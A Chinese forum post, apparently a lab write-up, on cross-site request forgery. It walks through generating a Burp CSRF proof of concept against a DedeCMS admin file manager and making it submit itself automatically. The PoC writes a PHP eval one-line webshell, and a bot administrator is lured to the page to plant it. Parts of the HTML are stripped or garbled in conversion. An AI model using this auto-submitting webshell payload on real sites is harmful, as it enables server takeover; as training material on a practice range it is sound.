> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1498103-1-1.html)

> [md]# 前言> - 前端渗透 / CSRF，学习一下！# CSRF 跨站请求伪造了解 csrf 跨站请求伪造：也被称为 “one click attack” 或者 sessingriding，通常缩写为 csrf 或者......

 ![](https://avatar.52pojie.cn/data/avatar/001/63/96/37_avatar_middle.jpg) 孤樱懶契 _ 本帖最后由 孤樱懶契 于 2021-8-22 08:28 编辑_  

前言
==

> *   前端渗透 / CSRF，学习一下！

CSRF 跨站请求伪造了解
=============

csrf 跨站请求伪造：也被称为 “one click attack” 或者 sessingriding，通常缩写为 csrf 或者 xsrf，是一种对网站的恶意利用。尽管听起来像跨站脚本 (xss) 但它与 xss 非常不同，xss 利用的是站点内的信任用户，而 csrf 是通过伪装来自受信任的用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 XSS 更具危险性。

用户只要不关闭阅览器或者退出登录的时候，如果用户无意间点开了构造好的 csrf 脚本的链接，可能会用户不想做的事（通过恶意的 js 代码可以操纵阅览器去发送修改用户信息的数据包给正常的网站）  
（因为用户访问正常网站时会产生 cookie，，而用户没有关闭或者退出登陆，所以这个 cookie 还没有失效，所以就会很容易的进入正常网站去修改用户的信息）

构造 csrf 恶意网站方法
--------------

Burp 有自己构造 csrf poc 的功能，在让用户访问这个构造好的网页

靶场环境
----

> **不用下源码，直接用这个测试 csrf，poc 的作用**
> 
> 织梦管理登陆：[http://59.63.200.79:8010/csrf/uploads/dede/login.php](http://59.63.200.79:8010/csrf/uploads/dede/login.php)
> 
> 登陆方式：admin admin123
> 
> **这个织梦网站，是我们提交问题反馈，机器人访问从而 getshell 的网站**
> 
> [http://59.63.200.79:8010/newcsrf/](http://59.63.200.79:8010/newcsrf/)
> 
> 问题反馈：[http://59.63.200.79:8010/newcsrf/test/](http://59.63.200.79:8010/newcsrf/test/)
> 
> 分析，提示是织梦 cms，应该是发给管理员访问，然后直接写一句话，因为管理员页面无法访问。

**由于找历史源码很麻烦，所以就不本地测试，直接用提供的第一个有账号密码的织梦靶场来测试是否存 CSRF**

首先登陆之后，进入文件式管理器，写一句话木马抓包看看

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818102059506.png)

发现并没有 token，或者验证码等限制，可以利用 BURP 的 POC 生成 CSRF

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818102229457.png)

创建一个 test.html 来存储，来测试

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818120547059.png)
> 
> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818120627673.png)

**打开刚刚新建的 test.html，点击 submit 测试**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818120706491.png)

成功生成 shell

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818120740891.png)

**但是这种需要我们自己点 submit 的方式一般没人会点，所以我们调成自动访问，加一个 name:aa，然后 document.aa.submit() 直接提交实现自动提交，无需点击**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form >
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden" <?php eval($_REQUEST[1]);?>" />
      <input type="hidden"   ±￡ ′?  " />
      <input type="submit" value="Submit request" />
    </form>
        <script>
                document.aa.submit();
        </script>
  </body>
</html>


```

**既然测试环境已经成功实现了 csrf，我们可以尝试获取一下 newcsrf 靶场的实战，接着通过目录扫描获取了 newcsrf 的文件操作目录** [http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php，将 poc 中的 action 改成 newcsrf 的文件操作目录就可以提交了（注意：上传的一句话木马路径也要改对](http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php，将poc中的action改成newcsrf的文件操作目录就可以提交了（注意：上传的一句话木马路径也要改对) ）

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818124106553.png)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form >
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden" <?php eval($_REQUEST[1]);?>" />
      <input type="hidden"   ±￡ ′?  " />
      <input type="submit" value="Submit request" />
    </form>
        <script>
                document.aa.submit();
        </script>
  </body>
</html>

```

**因为我们可能没有公网，所以靶场提供了一个可以上传 html 的地方，在问题反馈页面**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818121820266.png)

上传刚刚我们得到 poc，看看是否存在，记得确认是否存在

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818121848947.png)

**确认好了，就可以上传 shell 到主页了，问题反馈一下，让机器人访问一下**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818123847788.png)

**接着我们就可以在我们上传的路径看到 shell 了**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818123927992.png)

**下面基操，蚁剑连接，拿 flag**

> ![](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210818124250106.png)

我的个人博客
======

> 孤桜懶契：[http://gylq.gitee.io](http://gylq.gitee.io)
> -------------------------------------------------